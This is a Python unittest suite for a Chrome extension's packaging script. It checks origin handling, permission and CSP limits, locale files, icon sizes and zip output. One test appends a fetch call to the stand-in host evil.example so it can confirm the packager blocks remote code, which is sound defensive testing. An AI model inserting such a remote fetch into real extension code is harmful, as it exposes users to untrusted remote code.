"""Tests for package.py.  Run: uv run --no-project python -m unittest discover -s extensions/chrome/tests -p 'test_*.py'"""

from __future__ import annotations

import contextlib
import io
import json
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

EXT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(EXT))
import package  # noqa: E402


class PackageTest(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="sr-pkg-"))
        self.src = self.tmp / "src-copy"
        for name in package.SHIPPED:
            s = EXT / name
            if s.is_dir():
                shutil.copytree(s, self.src / name)
            else:
                self.src.mkdir(exist_ok=True)
                shutil.copy2(s, self.src / name)

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def edit_manifest(self, fn) -> None:
        p = self.src / "manifest.json"
        m = json.loads(p.read_text("utf-8"))
        fn(m)
        p.write_text(json.dumps(m), "utf-8")

    def build(self, origin: str = package.PROD_ORIGIN) -> dict:
        return package.build(self.tmp / "out", origin, src=self.src)

    def test_shipped_tree_passes(self) -> None:
        m = self.build()
        self.assertEqual(m["content_scripts"][0]["matches"], ["https://listen.streams.watch/app/*"])
        self.assertNotIn("tests", [p.name for p in (self.tmp / "out").iterdir()])

    def test_origin_rewrite(self) -> None:
        m = self.build("http://localhost:8123")
        self.assertEqual(m["content_scripts"][0]["matches"], ["http://localhost/app/*"])
        cfg = (self.tmp / "out" / "src" / "config.js").read_text("utf-8")
        self.assertIn('export const APP_ORIGIN = "http://localhost:8123";', cfg)

    def test_origin_trailing_slash_is_normalised(self) -> None:
        m = self.build("https://staging.example/")
        cfg = (self.tmp / "out" / "src" / "config.js").read_text("utf-8")
        self.assertIn('export const APP_ORIGIN = "https://staging.example";', cfg)
        self.assertEqual(m["content_scripts"][0]["matches"], ["https://staging.example/app/*"])
        self.assertEqual(m["homepage_url"], "https://staging.example/")

    def test_origin_written_as_the_browser_serialises_it(self) -> None:
        self.assertEqual(package.normalise_origin("HTTPS://Staging.Example:443/"), "https://staging.example")
        self.assertEqual(package.normalise_origin("http://localhost:8123"), "http://localhost:8123")
        self.assertEqual(package.normalise_origin("https://a.example/x/"), "https://a.example/x")

    def test_rejects_origin_with_path_query_or_fragment(self) -> None:
        for bad in ("https://a.example/app", "https://a.example?x=1", "https://a.example#f", "https://u@a.example",
                    "https://a.example:abc", "staging.example"):
            with self.subTest(bad=bad), self.assertRaises(package.CheckError):
                self.build(bad)

    def test_bad_origin_leaves_output_untouched(self) -> None:
        out = self.tmp / "out"
        out.mkdir()
        (out / "keep.txt").write_text("x", "utf-8")
        with self.assertRaises(package.CheckError):
            self.build("https://a.example/app")
        self.assertTrue((out / "keep.txt").exists())

    def test_check_does_not_touch_out(self) -> None:
        out = self.tmp / "dist"
        tree = out / "unpacked"
        tree.mkdir(parents=True)
        (tree / "manifest.json").write_text("{}", "utf-8")
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(package.main(["--check", "--out", str(out)]), 0)
        self.assertEqual((tree / "manifest.json").read_text("utf-8"), "{}")
        self.assertEqual(sorted(p.name for p in out.iterdir()), ["unpacked"])

    def test_alarms_is_allowed(self) -> None:
        self.assertIn("alarms", self.build()["permissions"])

    def test_plain_http_only_for_localhost(self) -> None:
        with self.assertRaises(package.CheckError):
            self.build("http://example.com")

    def test_rejects_extra_permission(self) -> None:
        self.edit_manifest(lambda m: m["permissions"].append("tabs"))
        with self.assertRaisesRegex(package.CheckError, "permissions"):
            self.build()

    def test_rejects_host_permissions(self) -> None:
        self.edit_manifest(lambda m: m.__setitem__("host_permissions", ["<all_urls>"]))
        with self.assertRaisesRegex(package.CheckError, "host permissions"):
            self.build()

    def test_rejects_weak_csp(self) -> None:
        def weaken(m: dict) -> None:
            m["content_security_policy"]["extension_pages"] = "script-src 'self' 'wasm-unsafe-eval'"

        self.edit_manifest(weaken)
        with self.assertRaisesRegex(package.CheckError, "CSP"):
            self.build()

    def test_rejects_missing_locale_key(self) -> None:
        p = self.src / "_locales" / "hi" / "messages.json"
        data = json.loads(p.read_text("utf-8"))
        del data["menu_read_link"]
        p.write_text(json.dumps(data, ensure_ascii=False), "utf-8")
        with self.assertRaisesRegex(package.CheckError, "hi: missing"):
            self.build()

    def test_rejects_long_description(self) -> None:
        p = self.src / "_locales" / "de" / "messages.json"
        data = json.loads(p.read_text("utf-8"))
        data["ext_description"]["message"] = "x" * 133
        p.write_text(json.dumps(data), "utf-8")
        with self.assertRaisesRegex(package.CheckError, "description"):
            self.build()

    def test_rejects_remote_code(self) -> None:
        f = self.src / "src" / "menus.js"
        f.write_text(f.read_text("utf-8") + '\nfetch("https://evil.example/x");\n', "utf-8")
        with self.assertRaisesRegex(package.CheckError, "fetch"):
            self.build()

    def test_rejects_wrong_icon_size(self) -> None:
        shutil.copy2(self.src / "icons" / "icon-16.png", self.src / "icons" / "icon-48.png")
        with self.assertRaisesRegex(package.CheckError, "icon-48"):
            self.build()

    def test_zip_is_deterministic_and_small(self) -> None:
        self.build()
        a = package.write_zip(self.tmp / "out", self.tmp / "a.zip")
        b = package.write_zip(self.tmp / "out", self.tmp / "b.zip")
        self.assertEqual(a, b)
        self.assertLess(a[0], package.ZIP_BUDGET_BYTES)


if __name__ == "__main__":
    unittest.main()
